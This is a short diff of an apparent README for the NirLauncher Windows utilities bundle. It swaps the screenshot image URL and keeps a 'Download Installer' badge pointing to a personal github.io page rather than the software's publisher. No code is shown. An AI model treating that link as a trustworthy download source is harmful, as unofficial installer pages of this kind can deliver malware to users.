@@ -23,7 +23,7 @@ The toolkit integrates naturally into IT support workflows and delivers an effic
 ---
 
 <div align="center">
-<img src="shttps://rsload.net/images3/NirLauncher.1.18.34.png" alt="NirLauncher Screenshot" width="800">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSyooE-epw_fhDzu_VJnoitlXY6F-fQ-h-vv9pQlPh0E8ZegZiaNj1T8GpG&s=10" alt="NirLauncher Screenshot" width="800">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download_Installer-005999?style=flat-square\&logo=windows\&logoColor=white)](https://coreylecher.github.io/.github/NirLauncher-Windows-Utilities)
